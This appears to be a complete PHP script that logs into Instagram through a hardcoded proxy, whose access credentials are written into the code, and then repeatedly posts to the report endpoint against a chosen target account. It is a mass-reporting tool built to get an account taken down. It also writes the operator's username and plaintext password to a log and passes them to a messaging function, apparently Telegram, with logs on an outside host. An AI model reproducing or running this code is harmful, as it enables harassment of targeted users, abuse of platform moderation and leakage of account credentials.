<?php
require "config.php";
require "class.php";
$pisah = $argv;

$username = $pisah[1];
$password = $pisah[2];
$target = $pisah[3];
$berapax = $pisah[4];
$chat_id = $pisah[5];
$logs = $pisah[6] . ".txt";


$proxy = "zproxy.lum-superproxy.io:22225";
$proxyauth = 'lum-customer-hl_6f5a8ba9-zone-data_center:Azizah666';

pesan("[Automatic reports to Instagram]

Coded By : ANDRI /.ft RIDWAN
________________________________________");
pesan("Logs : https://telegram.hostname.tech/$logs");
$ch = curl_init();
$data = [
    "username" => "$username",
    "enc_password" => '#PWD_INSTAGRAM_BROWSER:0:1589682409:' . $password,
    'queryParams' => [],
    "optIntoOneTap" => "false"
];

$datas = http_build_query($data);

//echo $datas;

$headers = [
    'accept: */*',
    'accept-encoding: gzip, deflate, br',
    'accept-language: ar,en-US;q=0.9,en;q=0.8',
    'content-type: application/x-www-form-urlencoded',
    'cookie: csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
    'origin: https://www.instagram.com',
    'referer: https://www.instagram.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
    'x-csrftoken: DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
    'x-ig-app-id: 936619743392459',
    'x-ig-www-claim: 0',
    'x-instagram-ajax: bc3d5af829ea',
    'x-requested-with: XMLHttpRequest'
];
curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/accounts/login/ajax/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');


curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
} else {
    echo $result . "\n";
}

$json = json_decode($result, 1);
if ($json['authenticated'] === false or !isset($json['authenticated'])) {
    file_put_contents("php://stderr", "Sandi Salah|$result\n");
    fwrite(fopen($logs, "a"), "Sandi Salah|$result\n");
    pesan("Sandi Salah|$result");
    die;
}
file_put_contents("php://stderr", "$result\n");
fwrite(fopen($logs, "a"), "Login Berhasil|$username|$password|$result\n");
pesan("Login Berhasil|$username|$password|$result\n");


curl_close($ch);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/' . $target . '/?__a=1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_POST, 1);
//curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
//curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
$headers = [
    'accept: */*',
    'accept-language: ar,en-US;q=0.9,en;q=0.8',
    'origin: https://www.instagram.com',
    'referer: https://www.instagram.com/',
    'cookie: csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
    'x-csrftoken: Ifv1Hdx5FaMS7PBd26AyKa7hnLC9d4eB',
    'x-ig-app-id: 936619743392459',
    'x-ig-www-claim: 0',
    'x-instagram-ajax: bc3d5af829ea',
    'x-requested-with: XMLHttpRequest',
    'X-CSRFToken: Ifv1Hdx5FaMS7PBd26AyKa7hnLC9d4eB'
];
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');

curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
} else {
    //echo $result;
}
curl_close($ch);
$json = json_decode($result, 1);

if (!isset($json["graphql"]["user"]["id"])) {
    file_put_contents("php://stderr", "ID Tidak ditemukan\n");
    fwrite(fopen($logs, "a"), "php://stderr", "ID Tidak ditemukan\n");
    pesan("ID Tidak ditemukan\n");

    die("");
}


$id = $json["graphql"]["user"]["id"];
echo "id :$id";
file_put_contents("php://stderr", "Mengambil id Target : $id\n");
pesan("Mengambil id Target : $id |Username : $target\n");
fwrite(fopen($logs, "a"), "Mengambil id Target : $id | $target\n");



file_put_contents("php://stderr", "Menjalankan\n");
fwrite(fopen($logs, "a"), "Menjalankan\n");
pesan("Menjalankan Report\n");
for ($i = 0; $i < $berapax; $i++) {



    $ch = curl_init();

    $data = [
        "source_name" => "",
        "reason_id" => '1',
        'frx_context' => '',
    ];

    $datas = http_build_query($data);

    //echo $datas;

    $headers = [
        'accept: */*',
        'accept-language: ar,en-US;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded',
        'cookie: csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
        'origin: https://www.instagram.com',
        'referer: https://www.instagram.com/',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
        'x-csrftoken: DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
        'x-ig-app-id: 936619743392459',
        'x-ig-www-claim: 0',
        'x-instagram-ajax: bc3d5af829ea',
        'x-requested-with: XMLHttpRequest'
    ];
    curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/users/' . $id . '/report/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');


    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    } else {
        echo $result . "\n";
    }
    curl_close($ch);
}
file_put_contents("php://stderr", "Berhasil Berjalan\n");

fwrite(fopen($logs, "a"), "Berhasil Berjalan\n");
pesan("Send : $berapax | Error : 0\n");
pesan("Sukses Report\n");
